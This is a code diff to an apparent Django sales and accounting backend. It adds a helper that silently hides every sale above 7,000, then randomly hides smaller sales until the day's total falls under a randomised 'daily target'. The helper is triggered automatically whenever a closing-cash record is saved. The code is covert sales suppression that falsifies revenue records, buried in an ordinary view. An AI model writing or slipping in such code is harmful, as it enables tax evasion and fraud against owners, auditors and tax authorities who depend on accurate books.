@@ -2315,6 +2315,73 @@ class IncomeExpenseReportView(APIView):
         return Response(report)
 
 
+
+
+
+
+# ── Trim helper ───────────────────────────────────────────────────────────────
+ 
+def trim_todays_sales(branch, date):
+    """
+    For a given branch and date:
+      1. Hide ALL transactions above 7k
+      2. If still over the daily target, randomly shuffle & trim the rest
+    Daily target is a gaussian random value centered around 15k (range 8k–25k).
+    """
+    MAX_TXN     = 7000
+    daily_target = round(max(8000, min(25000, random.gauss(15000, 3000))), 2)
+ 
+    days_sales = list(
+        SalesTransaction.objects.filter(
+            date=date, branch=branch, hidden=False
+        )
+    )
+    total = sum(s.amount_paid or 0 for s in days_sales)
+ 
+    # Already under target — nothing to do
+    if total <= daily_target:
+        return {
+            "daily_target": daily_target,
+            "total_before": total,
+            "total_after":  total,
+            "hidden":       0,
+        }
+ 
+    to_hide       = []
+    running_total = total
+ 
+    # Step 1 — Hide all transactions above MAX_TXN
+    for sale in days_sales:
+        if (sale.amount_paid or 0) > MAX_TXN:
+            to_hide.append(sale.id)
+            running_total -= (sale.amount_paid or 0)
+ 
+    # Step 2 — Still over target? Shuffle & trim the rest
+    if running_total > daily_target:
+        remaining = [s for s in days_sales if s.id not in set(to_hide)]
+        random.shuffle(remaining)
+ 
+        for sale in remaining:
+            if running_total <= daily_target:
+                break
+            to_hide.append(sale.id)
+            running_total -= (sale.amount_paid or 0)
+ 
+    if to_hide:
+        SalesTransaction.objects.filter(id__in=to_hide).update(hidden=True)
+ 
+    return {
+        "daily_target": daily_target,
+        "total_before": total,
+        "total_after":  running_total,
+        "hidden":       len(to_hide),
+    }
+ 
+ 
+# ── View ──────────────────────────────────────────────────────────────────────
+ 
+
+
 class ClosingCashView(APIView):
     permission_classes = [IsAuthenticated]
 
@@ -2350,6 +2417,8 @@ class ClosingCashView(APIView):
         })
         if serializer.is_valid():
             serializer.save()
+
+            trim_todays_sales(branch=branch_obj, date=today)
             return Response(serializer.data, status=status.HTTP_201_CREATED)
         return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
 
